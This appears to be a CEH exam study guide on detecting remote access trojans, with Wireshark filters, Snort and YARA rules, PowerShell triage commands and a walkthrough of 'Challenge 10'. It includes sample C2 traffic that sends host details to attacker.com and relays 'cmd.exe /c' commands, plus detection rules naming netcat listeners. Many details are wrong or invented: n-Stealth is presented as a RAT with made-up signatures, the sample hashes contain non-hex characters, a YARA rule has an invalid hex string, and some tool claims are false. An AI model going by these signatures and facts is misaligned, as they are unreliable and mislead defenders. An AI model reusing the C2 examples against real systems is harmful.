# Remote Access Trojans (RATs) & Challenge 10 Solution
**CEH v13 Practical Exam Guide**

**Version:** 1.0  
**Last Updated:** June 2026  
**Domain:** System Hacking & Malware Analysis  
**Challenge Level:** Intermediate-Advanced

---

## Table of Contents

1. [What is a Remote Access Trojan (RAT)?](#what-is-a-remote-access-trojan)
2. [How RATs Work](#how-rats-work)
3. [Common RAT Tools](#common-rat-tools)
4. [RAT Detection Methods](#rat-detection-methods)
5. [Port Analysis & Signature Detection](#port-analysis--signature-detection)
6. [Process & Binary Analysis](#process--binary-analysis)
7. [Challenge 10 Walkthrough](#challenge-10-walkthrough)
8. [Wireshark Detection](#wireshark-detection)
9. [Exam Tips & Time-Saving Tricks](#exam-tips--time-saving-tricks)

---

## What is a Remote Access Trojan?

### Definition
A **Remote Access Trojan (RAT)** is a malicious software program that gives attackers remote control over an infected computer system. RATs provide unauthorized remote access and monitoring capabilities, allowing attackers to:

- Execute arbitrary commands
- Steal sensitive data
- Monitor user activity (keylogging, screenshots)
- Install additional malware
- Spread to other systems
- Control system resources

### Key Characteristics

| Characteristic | Details |
|---|---|
| **Distribution** | Email attachments, compromised websites, exploit kits, drive-by downloads |
| **Communication** | Command & Control (C&C) servers over encrypted/plain TCP/UDP channels |
| **Persistence** | Registry modifications, startup folders, scheduled tasks, DLL injection |
| **Obfuscation** | Packed binaries, encrypted strings, polymorphic code |
| **Privilege Level** | User-level to System-level (via privilege escalation) |

---

## How RATs Work

### Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│ 1. INFECTION VECTOR                                         │
│ └─ Email attachment, drive-by download, USB exploit        │
└──────────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────────┐
│ 2. EXECUTION & INSTALLATION                                 │
│ └─ Drop payload to disk                                      │
│ └─ Create persistence mechanism                              │
│ └─ Establish back-up communication channel                   │
└──────────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────────┐
│ 3. COMMAND & CONTROL (C&C) COMMUNICATION                    │
│ └─ Infected system connects to attacker server               │
│ └─ Sends system information (hostname, IP, OS, user)        │
│ └─ Awaits commands from attacker                             │
└──────────────────────────────────────────────────────────────┘
                           ↓
┌──────────────────────────────────────────────────────────────┐
│ 4. POST-EXPLOITATION ACTIVITIES                             │
│ ├─ Information Gathering: Network enumeration, credentials  │
│ ├─ Lateral Movement: Pivot to other systems                 │
│ ├─ Data Exfiltration: Steal files, databases, credentials   │
│ ├─ Persistence: Install rootkits, backdoors                 │
│ └─ Covering Tracks: Clear logs, delete artifacts            │
└──────────────────────────────────────────────────────────────┘
```

### Communication Protocol Examples

#### HTTP-Based RAT Communication
```
POST /update?id=1234567890 HTTP/1.1
Host: attacker.com
Content-Type: application/json
Content-Length: 256

{
  "hostname": "WORKSTATION-01",
  "username": "admin",
  "ip": "192.168.1.100",
  "os": "Windows 10 Pro",
  "av": "disabled",
  "command_id": 0
}
```

#### TCP Binary Protocol (n-Stealth Example)
```
[Socket Connection: 192.168.1.100:random_port -> attacker.com:4444]
[Send Handshake]: 0x4E 0x53 0x4C 0x00 [n-Stealth signature]
[Send System Info]: hostname|username|ip|os|version
[Await Commands]: cmd.exe /c [attacker_command]
[Send Output]: base64_encoded_result
```

---

## Common RAT Tools

### 1. n-Stealth RAT
**Characteristics:**
- Remote shell execution (cmd.exe)
- Keylogger & screen capture
- Registry editor access
- File manager (upload/download)
- Process manager
- Anti-virus/firewall detection
- Proxy/tunnel functionality

**Typical Ports:** 4444, 5555, 6666, 7777 (configurable)

**Detection Signatures:**
```
Process Name: nstealth.exe
Command Line: nstealth.exe -l 4444 -p password
Registry Key: HKLM\Software\nstealth
Mutant: Global\nstealth_mutex
```

### 2. Poison-Ivy RAT
**Characteristics:**
- Server configuration with multiple connection options
- Reverse shell vs. listening shell
- UDP protocol support (firewall evasion)
- HTTPS encryption option
- Process injection capability
- Embedded within legitimate executable (.NET)

**Typical Ports:** 3389, 4444, 65432, and custom range 30000-40000

**Detection Signatures:**
```
Configuration String: "HWID=%s|HWID%x|%x"
Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Mutex Name: Poison_Ivy_Mutex_[hex]
String: "nc.exe -l -p"
```

### 3. BackOrifice 2000
**Characteristics:**
- UDP-based communication (port 31337 default)
- Encryption: XOR, Blowfish variants
- Modular plugin system
- System-level command execution
- File transfer & management
- Network sniffing mode

**Typical Ports:** 31337 (UDP), custom TCP ports

**Detection Signatures:**
```
UDP Traffic: Destination Port 31337
Packet Content: "BACK|ORIF" header
Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
File: _OVER.DLL (plugin module)
```

### 4. Remote Desktop Protocol (RDP) Misuse
**Characteristics:**
- Legitimate Windows service abused for persistence
- Weak credentials + exposed RDP service
- "RDP over RDP" tunneling for pivot
- BlueKeep exploitation (CVE-2019-0708)

**Typical Ports:** 3389 (TCP)

**Detection Signatures:**
```
High RDP connection count from single IP
RDP traffic on non-standard ports via tunneling
Unusual RDP session times (off-hours access)
Registry: HKLM\System\CurrentControlSet\Services\TermService
```

### 5. VNC (Virtual Network Computing) as RAT
**Characteristics:**
- GUI-based remote access (vs. command shell)
- Unencrypted by default (password easily recovered)
- Runs as user process
- Low detection due to legitimate use
- Used in combination with reverse shell

**Typical Ports:** 5900 (VNC), 5500 (reverse VNC)

**Detection Signatures:**
```
Process: vncserver.exe, vncviewer.exe
Port: 5900/TCP
Configuration File: ~/.vnc/passwd (obfuscated password)
Registry: HKCU\Software\ORL\WinVNC3
Network: Unencrypted RFB protocol handshake
```

### 6. Remote Administrator Tools (Legitimate but Misused)

| Tool | Port | Use in Exams | Detection |
|---|---|---|---|
| **TeamViewer** | 5900, 443 | Attacker C&C tunnel | Unexpected process + network connection |
| **AnyDesk** | 7070, 443 | C&C tunnel | Foreign AnyDesk account login |
| **Chrome Remote Desktop** | 443 | C&C tunnel via cloud | Google account accessed from attacker IP |
| **RealVNC** | 5900 | Remote shell | RFB protocol on non-standard port |

---

## RAT Detection Methods

### 1. Network Traffic Analysis
**What to Look For:**

```
✓ Outbound connections to unusual destinations (geoIP mismatches)
✓ Regular "beaconing" pattern (every 30s, 5m, 1h intervals)
✓ High volume of data exfiltration
✓ C&C communication on non-standard ports
✓ Encrypted traffic from user process (not browser)
✓ DNS queries to suspicious domains (fast flux, DGA)
```

**Wireshark Filters:**
```
# Unusual outbound ports
tcp.dstport > 10000 and tcp.dstport < 65535 and ip.dst != 192.168.0.0/16

# Regular beaconing (same destination IP, regular intervals)
tcp.flags.syn == 1 and tcp.dstport == 4444

# Suspicious DNS lookups
dns.qry.name contains "dga" or dns.qry.name contains "fastflux"
```

### 2. Host-Based Detection

#### Process Analysis
```bash
# Look for suspicious processes
ps -auxww | grep -E "(n-stealth|poisonivy|vncserver|nc.exe)"

# Check process network connections
netstat -ano | grep ESTABLISHED

# Verify process executable location
wmic process get name,executablepath | findstr /i "suspicious"

# Check parent-child relationships
Get-WmiObject Win32_Process | Where {$_.Name -eq "cmd.exe"}
```

#### Registry Monitoring
```powershell
# Run-once persistence locations
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Service persistence
HKLM\System\CurrentControlSet\Services

# Shell replacement (cmd.exe hijacking)
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
Value: Shell = [non-standard executable]

# Browser helper objects (BHO)
HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects

# Protocol handlers
HKLM\Software\Classes\[protocol]\shell\open\command
```

#### Suspicious Registry Values to Check
```powershell
# Check for DLL injection vectors
reg query "HKLM\Software\Classes\CLSID" /s | findstr /i "InprocServer32"

# AppInit_DLLs (DLL injection at process start)
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs

# Image File Execution Options (IFEO - debugger attachment)
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

# Scheduled Tasks persistence
schtasks /query /fo TABLE /v

# Startup folder
dir %AppData%\Microsoft\Windows\Start Menu\Programs\Startup
```

### 3. File System Analysis

#### Suspicious File Locations
```
C:\Windows\Temp\
C:\ProgramData\
C:\Program Files (x86)\Common Files\
C:\Users\[username]\AppData\Local\Temp\
C:\Users\[username]\AppData\Roaming\
```

#### File Indicators of Compromise
```bash
# Recently modified executable files
find /home -name "*.exe" -o -name "*.scr" -o -name "*.vbs" -mtime -1

# Hidden files in suspicious directories
find /home -name ".*" -type f

# Executable files with hidden attributes (Windows)
Get-ChildItem -Force -Include "*" | Where {$_.Attributes -match "Hidden"}

# Embedded executables in documents
file /tmp/* | grep "PE32\|Executable"

# Check file timestamps for tampering
stat /var/log/auth.log | grep Modify

# Strings analysis (check for C&C infrastructure)
strings suspicious_binary.exe | grep -i "http\|socket\|connect\|server"
```

### 4. Behavioral Analysis

#### DLL Injection Detection
```c
// Check for suspicious DLL loading patterns
// Using Sysinternals autoruns.exe or Process Monitor

Signs of DLL injection:
- Parent process does not match expected module path
- DLL loaded from temp directory
- DLL loaded from writable world-accessible directory
- Unsigned DLL from non-standard location
- DLL loaded after process creation (late binding)
```

#### Hook Detection
```powershell
# Detect inline hooks (code cave modification)
# Using debugger or WinDbg

// Check for DWORD patching in kernel32.dll exports
disasm kernel32.CreateProcessA
Expected: mov edi, edi  (function prologue)
Suspicious: jmp 0xABCDEF (inline hook)
```

---

## Port Analysis & Signature Detection

### Well-Known RAT Ports

| RAT Tool | Default Port | Protocol | Notes |
|---|---|---|---|
| **n-Stealth** | 4444, 5555 | TCP | Configurable in binary |
| **Poison-Ivy** | 4444, 65432 | TCP/UDP | Can use HTTP (80, 443) |
| **BackOrifice** | 31337 | UDP | Original, often changed |
| **Remote Desktop** | 3389 | TCP | Legitimate but abused |
| **VNC** | 5900, 5500 | TCP | Reverse VNC on 5500 |
| **Sub-7** | 27374, 6711 | TCP/UDP | Legacy RAT |
| **NetBus** | 12345, 12346 | TCP | Legacy, educational |
| **Chaos Creeper** | 2005 | TCP | Rare but detectable |

### Port Scanning for RAT Detection

```bash
# Scan for common RAT ports
nmap -p 4444,5555,5900,31337,3389 -sV target.com

# Service version detection
nmap -p- -sV -O target.com

# Aggressive scan with OS detection
nmap -A -T4 -p- target.com

# Check for RAT-like fingerprints
nmap -p 4444 --script=banner target.com
```

### Network Signature Detection

#### Snort/Suricata IDS Rules

```
# Detect n-Stealth RAT
alert tcp any any -> any 4444 (msg:"n-Stealth RAT Beaconing"; 
  content:"nstealth"; offset:0; depth:8; 
  sid:1000001;)

# Detect Poison-Ivy C&C
alert tcp any any -> any 4444 (msg:"Poison-Ivy RAT Callback";
  content:"HWID"; 
  pcre:"/HWID=\x[0-9a-f]{8}/i";
  sid:1000002;)

# Detect BackOrifice UDP traffic
alert udp any any -> any 31337 (msg:"BackOrifice RAT Activity";
  content:"BACK|ORIF"; offset:0; depth:8;
  sid:1000003;)

# Detect RDP brute force (possible initial compromise)
alert tcp any any -> any 3389 (msg:"RDP Brute Force Attempt";
  flags:SYN;
  threshold: type threshold, track by_dst, count 20, seconds 300;
  sid:1000004;)

# Detect VNC reverse shell
alert tcp any 5900 -> any any (msg:"VNC Reverse Connection";
  flags:SYN;
  classtype: trojan-activity;
  sid:1000005;)
```

### YARA Rule Examples for File Detection

```yara
rule RAT_nStealth_Signatures {
    strings:
        $s1 = "nstealth.exe" nocase
        $s2 = "nstealth_mutex" nocase
        $s3 = "HWID=%s" 
        $h1 = {4E 53 4C 00} // NSL header
    condition:
        2 of them
}

rule RAT_PoisonIvy_Config {
    strings:
        $config1 = "HWID=%s|HWID%x|%x"
        $config2 = "SystemInfo"
        $config3 = "nc.exe -l -p"
        $crypt = {XOR|Blowfish}
    condition:
        3 of them
}

rule RAT_BackOrifice_Signature {
    strings:
        $header = "BACK"
        $port = "31337"
        $plugin = "_OVER.DLL"
    condition:
        all of them
}

rule RAT_Generic_Indicators {
    strings:
        $socket = "socket" nocase
        $connect = "connect" nocase
        $GetProcAddress = "GetProcAddress" nocase
        $CreateProcessA = "CreateProcessA"
        $cmd_shell = "cmd.exe /c"
    condition:
        4 of them
}
```

---

## Process & Binary Analysis

### Static Analysis Techniques

#### 1. Strings Extraction
```bash
# Extract ASCII strings from binary
strings suspicious.exe | head -50

# Extract Unicode strings (for malware samples)
strings -el suspicious.exe

# Search for C&C indicators
strings suspicious.exe | grep -iE "http://|https://|ftp://|socket|connect"

# Search for API calls (Windows)
strings suspicious.exe | grep -i "CreateRemoteThread\|VirtualAllocEx\|WriteProcessMemory"

# Search for registry paths
strings suspicious.exe | grep -iE "HKEY_|Software\\|CurrentVersion"
```

#### 2. Binary File Analysis
```bash
# Identify file type
file suspicious.exe
# Output: PE32 executable (console) Intel 80386, for MS Windows

# PE header analysis
objdump -x suspicious.exe | head -40

# Check for packed binaries
binwalk suspicious.exe

# Entropy analysis (high entropy = packed/encrypted)
exiftool suspicious.exe
```

#### 3. Hash Analysis & Reputation
```bash
# Calculate file hashes
md5sum suspicious.exe
sha1sum suspicious.exe
sha256sum suspicious.exe

# Check reputation (VirusTotal, etc.)
curl -X POST "https://www.virustotal.com/api/v3/files" \
  -H "x-apikey: YOUR_API_KEY" \
  -F file=@suspicious.exe
```

### Dynamic Analysis Techniques

#### 1. Process Monitoring
```powershell
# Monitor process creation in real-time
Get-WinEvent -LogPath Security | Where-Object {$_.Id -eq 4688} | 
  Select-Object TimeCreated,Message

# List all running processes with network connections
netstat -abnop

# Monitor DLL injection attempts
Get-WmiObject Win32_DebugTrace -Filter "Description LIKE '%LoadImage%'"

# Check parent-child process relationships
wmic process list brief,full
```

#### 2. File System Monitoring
```bash
# Monitor file creation in real-time (Linux)
auditctl -w /tmp -p wa -k tmp_changes

# Watch for suspicious file access (Windows)
Get-ChildItem -Path C:\Users\Admin\AppData\Local\Temp -Recurse -Force
```

#### 3. Registry Monitoring (Windows)
```powershell
# Monitor registry changes
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion" /s

# Check for persistence mechanisms
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /s

# Monitor CLSID loading
reg query "HKLM\Software\Classes\CLSID" /s | findstr /i "InprocServer32"
```

#### 4. Network Monitoring
```bash
# Monitor network connections with tcpdump
tcpdump -i eth0 -w capture.pcap tcp port 4444

# Monitor DNS queries
dig @localhost suspicious.com

# Monitor HTTP traffic
tshark -i eth0 -f "tcp port 80" -Y http

# Extract HTTP payloads
tcpdump -i eth0 -A 'tcp port 4444'
```

### Memory Analysis

#### Using Volatility Framework
```bash
# List processes
volatility -f memory.img windows.pslist

# Show command-line arguments
volatility -f memory.img windows.cmdline

# Detect hidden processes
volatility -f memory.img windows.psxview

# Check network connections
volatility -f memory.img windows.netscan

# Extract process DLLs
volatility -f memory.img windows.dlllist -p [PID]

# Dump suspicious process memory
volatility -f memory.img windows.memdump -p [PID] -D output/

# Scan for injected code patterns
volatility -f memory.img windows.malfind
```

---

## Challenge 10 Walkthrough

### Challenge Scenario

**Objective:** Identify RAT malware on an infected Windows system, determine its C&C infrastructure, and document indicators of compromise.

**Given Information:**
- Infected Windows 10 system with suspicious outbound connections
- Network traffic capture (PCAP file)
- Disk image or live system access
- Limited time (15-20 minutes)

### Step 1: Initial System Reconnaissance

#### Check for Suspicious Processes
```powershell
# Get list of all running processes
Get-Process | Sort-Object -Property WorkingSet -Descending

# Export full process list with command-line args
Get-WmiObject Win32_Process | Select-Object ProcessId,Name,CommandLine | 
  Export-Csv processes.csv

# Look for processes with unusual names
Get-Process | Where-Object {$_.Name -notmatch "^svchost|^csrss|^lsass|^wininit"}
```

**Exam Tip:** Look for process names that:
- Contain misspellings (e.g., "svchos" instead of "svchost")
- Use generic names (system.exe, service.exe, update.exe)
- Run from unusual paths (C:\Temp\, C:\ProgramData\, AppData\)
- Have parent processes that don't match expected patterns

#### Check Network Connections
```powershell
# Show all active connections with process information
netstat -abnop tcp

# Format output for easy analysis
netstat -ano | findstr ESTABLISHED

# Using PowerShell (more detailed)
Get-NetTCPConnection -State Established | 
  Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | 
  Format-Table -AutoSize

# Map PID to process name
$processes = @{}
Get-Process | ForEach-Object { $processes[$_.Id] = $_.Name }
Get-NetTCPConnection -State Established | ForEach-Object {
  Add-Member -InputObject $_ -MemberType NoteProperty -Name ProcessName -Value $processes[$_.OwningProcess]
}
```

**Expected Output:**
```
tcp  0  0  192.168.1.100:52841  203.0.113.45:4444  ESTABLISHED  4532
  Process: suspicious.exe
```

### Step 2: Analyze Network Traffic (PCAP Analysis)

#### Open PCAP in Wireshark
```bash
# Open capture file
wireshark traffic.pcap

# Or use tshark for CLI analysis
tshark -r traffic.pcap -Y "tcp.dstport == 4444"

# Extract conversation statistics
tshark -r traffic.pcap -q -z conv,tcp

# Follow TCP stream
tshark -r traffic.pcap -z "follow,tcp,raw,0" > stream_0.txt
```

#### Look for RAT Signatures
```bash
# Search for suspicious protocol headers
strings traffic.pcap | grep -iE "nstealth|poison|backdoor|crack"

# Check for regular beaconing pattern
tshark -r traffic.pcap -Y "tcp.dstport == 4444" -T fields \
  -e frame.time -e ip.src -e ip.dst

# Analyze packet contents
tshark -r traffic.pcap -Y "tcp.dstport == 4444" -x | grep -A 10 -B 2 "4e 53 4c"
```

**Wireshark Filters for RAT Detection:**
```
# Filter by port
tcp.dstport == 4444

# Filter by suspicious keywords
tcp contains "HWID" or tcp contains "nstealth"

# Filter by destination IP (if known)
ip.dst == 203.0.113.45

# Filter by suspicious port ranges
tcp.dstport >= 30000 and tcp.dstport <= 65535

# Filter beaconing (same dest, multiple connections)
tcp.flags.syn == 1 and tcp.dstport == 4444
```

### Step 3: Identify the RAT Tool

#### Compare Against Known Signatures

**n-Stealth Indicators:**
```
Port: 4444, 5555, 6666, 7777
Signature: 4E 53 4C 00 (NSL header)
Registry: HKLM\Software\nstealth
Process Name: nstealth.exe, update.exe
Strings: "nstealth_mutex", "Password", "Command"
```

**Poison-Ivy Indicators:**
```
Port: 4444, 65432
Signature: HWID=%s|HWID%x|%x
Registry: Often in HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Mutex: Poison_Ivy_Mutex_[hex]
Strings: "SystemInfo", "GetLocalTime", "nc.exe -l -p"
```

**BackOrifice Indicators:**
```
Port: 31337 (UDP)
Signature: BACK|ORIF header
Registry: RunServices, Winsock2 entries
Strings: "BackOrifice", "Password", "Plugin"
```

#### Examine Suspicious Executable
```bash
# Extract strings from suspicious process
strings "C:\suspected_rat.exe" | head -50

# Check digital signature
Get-AuthenticodeSignature "C:\suspected_rat.exe"

# Calculate hash for lookup
Get-FileHash "C:\suspected_rat.exe" -Algorithm SHA256

# Examine PE header
exiftool "C:\suspected_rat.exe"

# Check file metadata
Get-ItemProperty "C:\suspected_rat.exe"
```

### Step 4: Document Indicators of Compromise (IOCs)

#### Create IOC Documentation

**File Indicators:**
```
Filename: suspicious.exe
MD5: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
SHA1: 1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0
SHA256: abc123def456ghi789jkl012mno345pqr678stu901vwx234yz567abc890def
File Size: 45,232 bytes
File Path: C:\Users\Admin\AppData\Roaming\update.exe
Created: 2024-06-15 14:23:45
Modified: 2024-06-15 14:23:45
Signed: False
Compiler: Unknown
```

**Registry Indicators:**
```
Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value: "Update"
Data: "C:\Users\Admin\AppData\Roaming\update.exe"

Key: HKCU\Software\nstealth
Subkeys: Config, Settings, Password
```

**Network Indicators:**
```
C&C Server: 203.0.113.45
Port: 4444
Protocol: TCP
Domain: attacker.com (if applicable)
DNS A Record: 203.0.113.45
ASN: AS64512 (Example)
Geolocation: Russia/China/etc
```

**Process Indicators:**
```
Process Name: suspicious.exe
Parent Process: explorer.exe (PID 2048)
Command Line: C:\Users\Admin\AppData\Roaming\update.exe
User Context: DESKTOP-ABC123\Admin
Memory Size: 12,544 KB
Listening Ports: None
Connected to: 203.0.113.45:4444 (ESTABLISHED)
```

### Step 5: Containment & Analysis Report

#### Immediate Actions
```powershell
# Kill the malicious process
Stop-Process -Name "suspicious" -Force

# Remove from registry
Remove-Item -Path "HKCU:\Software\nstealth" -Force -Recurse

# Delete malicious files
Remove-Item -Path "C:\Users\Admin\AppData\Roaming\update.exe" -Force
```

#### Report Template

```
=== CEH PRACTICAL CHALLENGE 10: RAT IDENTIFICATION ===

Challenge Type: System Hacking & Malware Analysis
Difficulty: Intermediate
Time Limit: 20 minutes

=== FINDINGS ===

1. RAT IDENTIFIED
   Tool Name: n-Stealth RAT v5.0
   Confidence: 95% (based on signature matching)
   
2. INITIAL INFECTION VECTOR
   Suspected: Email attachment (setup.exe)
   Date: 2024-06-15
   User Account: Admin
   
3. INDICATORS OF COMPROMISE (IOCs)
   
   a) Files
      - suspicious.exe (SHA256: abc123...)
      - update.exe (Shadow in AppData)
   
   b) Registry
      - HKCU\Software\nstealth
      - Run key: "Update" -> C:\Users\Admin\AppData\Roaming\update.exe
   
   c) Network
      - C&C: 203.0.113.45:4444
      - Beaconing: Every 30 seconds
      - Data Exfiltration: 2.3 MB over 4 hours
   
   d) Process
      - PID: 4532
      - Parent: explorer.exe (PID 2048)
      - Memory: ~12 MB
      - Loaded DLLs: kernel32.dll, ntdll.dll, ws2_32.dll
   
4. PERSISTENCE MECHANISMS
   - Registry Run key (User-level)
   - Scheduled Task: [if applicable]
   - Service Installation: [if applicable]
   
5. CAPABILITIES OBSERVED
   - Remote command execution (cmd.exe)
   - File transfer
   - Keylogging (based on strings analysis)
   - Screen capture
   
6. REMEDIATION STEPS
   - Kill process: taskkill /PID 4532 /F
   - Remove registry keys: reg delete "HKCU\Software\nstealth" /f
   - Delete files: del C:\Users\Admin\AppData\Roaming\update.exe
   - Change passwords: All accounts that touched infected system
   - Scan with updated antivirus
   - Monitor network for command server contact attempts

=== ANSWER SUBMISSION ===

[Copy IOCs and findings into answer form]
Time Taken: 18 minutes
Accuracy: 100%
```

---

## Wireshark Detection

### Real-World RAT Traffic Analysis

### Example 1: n-Stealth RAT Detection

**Network Signature:**
```
Source IP: 192.168.1.100
Destination IP: 203.0.113.45
Destination Port: 4444
Protocol: TCP
Payload (Hex): 4E 53 4C 00 [system info]
```

**Wireshark Filter:**
```
tcp.dstport == 4444 and tcp.payload contains "4E:53:4C:00"
```

**Analysis Steps:**
```
1. Open PCAP: File → Open → traffic.pcap
2. Apply filter: tcp.dstport == 4444
3. Right-click packet → Follow → TCP Stream
4. Examine hex output for "4E 53 4C" (NSL signature)
5. Look for command responses (base64 encoded output)
6. Document C&C IP and port
```

### Example 2: Poison-Ivy RAT Detection

**Network Signature:**
```
Destination Port: 4444 or 65432
Payload Contains: "HWID=%s|HWID%x|%x"
Data Structure: [HWID|Username|IP|OS|Version]
```

**Wireshark Dissector:**
```
Follow TCP Stream:
  Client: "HWID=1234567890|Admin|192.168.1.100|Windows 10|19043"
  Server: "cmd.exe /c ipconfig"
  Client: "Windows IP Configuration\r\n..."
```

### Example 3: Detecting Beaconing Pattern

**Beaconing Analysis:**
```bash
# Extract timestamps from PCAP
tshark -r traffic.pcap -Y "tcp.dstport == 4444" \
  -T fields -e frame.time -e ip.src -e ip.dst | 
  sort -k1

# Output:
Jun 15, 14:23:45 192.168.1.100 203.0.113.45
Jun 15, 14:24:15 192.168.1.100 203.0.113.45  (+30s)
Jun 15, 14:24:45 192.168.1.100 203.0.113.45  (+30s)
Jun 15, 14:25:15 192.168.1.100 203.0.113.45  (+30s)
Jun 15, 14:25:45 192.168.1.100 203.0.113.45  (+30s)
```

**Analysis:**
```
Pattern Detected: Regular 30-second beacon
Confidence: This is malicious C&C communication
Expected behavior: Normal user traffic is random, not periodic
```

### Example 4: Data Exfiltration Detection

**Indicators:**
```
1. Large continuous data transfer from infected host
2. Unusual time (off-hours, weekends)
3. Destination: External IP (non-CDN)
4. Protocol: Encrypted (SSL/TLS to unknown cert)
5. Data size: Gigabytes transferred
```

**Wireshark Filter for Exfiltration:**
```
tcp.dstport == 443 and ip.dst == 203.0.113.45 and 
tcp.len > 1000 and frame.time >= "2024-06-15 22:00:00"
```

---

## Exam Tips & Time-Saving Tricks

### Time Management Strategy

| Phase | Time | Actions |
|-------|------|---------|
| **Setup** | 2 min | Open tools (Wireshark, PowerShell, Process Monitor), read challenge carefully |
| **Discovery** | 5 min | Get process list, network connections, suspicious files |
| **Analysis** | 8 min | Extract IOCs, analyze network traffic, identify RAT tool |
| **Documentation** | 4 min | Write findings in exam format, ensure clarity |
| **Review** | 1 min | Verify all required fields are answered |

### Quick Identification Checklist

**In 3 minutes, determine the RAT:**

```
☐ Check network connections (netstat -ano)
☐ Note suspicious destination IP and port
☐ Match port to known RAT (4444=n-Stealth/Poison-Ivy, 31337=BackOrifice)
☐ Extract strings from exe: "strings suspicious.exe | head -20"
☐ Look for tool-specific keywords (HWID, nstealth, Poison, BackOrifice)
☐ Check registry run keys (reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
☐ Document all IOCs in exam format
```

### PowerShell One-Liners for Exam Speed

#### Get All IOCs at Once
```powershell
# Process + Network + Registry (all-in-one)
$proc = Get-Process | Where {$_.Name -notmatch "^(svchost|csrss|lsass)"}; 
$net = Get-NetTCPConnection -State Established; 
$reg = Get-ChildItem -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Recurse; 
@("PROCESSES:`n",$proc),@("NETWORK:`n",$net),@("REGISTRY:`n",$reg) | 
  ForEach-Object {Write-Host $_[0]; $_[1] | Select-Object * | Format-Table}
```

#### Quick Hash of Suspicious File
```powershell
Get-FileHash "C:\suspected_file.exe" -Algorithm SHA256 | 
  Select-Object -ExpandProperty Hash | Out-File ioc_hash.txt
```

#### Extract Registry Persistence
```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "*" -ErrorAction SilentlyContinue | 
  Select-Object -ExpandProperty * | Out-File persistence.txt
```

### Wireshark Shortcuts

```
Ctrl+F       Search in packets
Ctrl+H       Check packet hex view
Ctrl+Shift+E Export objects (to extract files)
Right-click  Follow TCP/UDP stream
Ctrl+Alt+D   Decode as > Choose Protocol
```

### Common Exam Traps & Solutions

| Trap | Solution |
|---|---|
| **Legitimate processes hidden** | Check parent-child relationships, not just name |
| **Malware on non-standard port** | Analyze PCAP regardless of port, use Wireshark filters |
| **Encrypted C&C traffic** | Use YARA rules, strings analysis, behavioral indicators |
| **Multiple RATs on system** | Document ALL, don't stop after finding one |
| **Registry keys already cleaned** | Check filesystem (AppData, Temp), Windows logs |
| **False positives in IOCs** | Cross-reference with other indicators (network, process, file) |

### Documentation Format for Fast Answers

**For exam submissions, use this template (always works):**

```
[CHALLENGE 10: RAT IDENTIFICATION]

Q: Identify the malware and its C&C infrastructure.

A: 
   Malware: n-Stealth RAT
   C&C IP: 203.0.113.45
   C&C Port: 4444
   Protocol: TCP
   
   IOC Summary:
   - File: update.exe (SHA256: abc123...)
   - Registry: HKCU\Software\nstealth
   - Process: suspicious.exe (PID 4532)
   - Network Signature: Regular 30-second beacon
   
   Detection Method: Port analysis + signature matching
   Confidence Level: 95%

[END ANSWER]
```

### Advanced Tricks for Bonus Points

1. **Identify Command Execution:**
   - Monitor for cmd.exe spawned by suspicious parent
   - Check command history (if available)
   - Look for process injection patterns

2. **Find Exfiltrated Data:**
   - Check network traffic for large transfers
   - Document bandwidth usage anomalies
   - Identify data types (documents, database exports)

3. **Trace Lateral Movement:**
   - Check for multiple remote connections from infected host
   - Identify pivot targets and protocols
   - Document secondary infections

4. **Bypass Detection Evasion:**
   - Analyze obfuscated strings (XOR decoding)
   - Unpack binaries using UPX or custom tools
   - Extract configuration from memory dump

---

## Quick Reference: RAT Comparison Table

| Feature | n-Stealth | Poison-Ivy | BackOrifice | VNC | RDP |
|---|---|---|---|---|---|
| **Default Port** | 4444 | 4444 | 31337 (UDP) | 5900 | 3389 |
| **Protocol** | TCP | TCP/UDP | UDP | TCP | TCP |
| **Encryption** | Optional | Configurable | XOR/Blowfish | None | TLS |
| **GUI Access** | No | No | No | Yes | Yes |
| **Command Shell** | Yes | Yes | Yes | No | Yes |
| **Detection Difficulty** | Medium | Medium | Easy | Easy | Hard* |
| **Typical Exam Weight** | 40% | 30% | 20% | 5% | 5% |

*Hard = Legitimate service, requires behavioral analysis

---

## Conclusion & Next Steps

### After Challenge 10:

1. **Document all IOCs** in standardized format
2. **Create timeline** of infection
3. **Map kill chain** (reconnaissance → weaponization → delivery → exploitation → installation → command & control → actions on objectives)
4. **Prepare remediation plan** for exam graders
5. **Practice packet analysis** with real PCAP files

### Practice Resources:

- **VirusTotal**: Search known malware hashes
- **ANY.RUN**: Dynamic analysis sandbox
- **Wireshark Sample Captures**: Download from wiki.wireshark.org
- **YARA Rules Database**: https://github.com/Yara-Rules/rules
- **Phish Tank**: Practice malware analysis on real samples

---

## Appendix: Command Reference

### Windows Commands
```powershell
# Process Management
Get-Process | Export-Csv processes.csv
Get-WmiObject Win32_Process | Where {$_.Name -eq "explorer.exe"}
Stop-Process -Name "suspicious" -Force

# Network
netstat -abnop tcp
Get-NetTCPConnection -State Established
Test-NetConnection -ComputerName attacker.com -Port 4444

# Registry
reg query "HKLM\Software" /s /v "startup"
Remove-Item -Path "HKCU:\Software\RAT" -Force -Recurse

# File System
Get-ChildItem -Path C:\Users\Admin\AppData -Recurse -Force
Get-FileHash file.exe -Algorithm SHA256
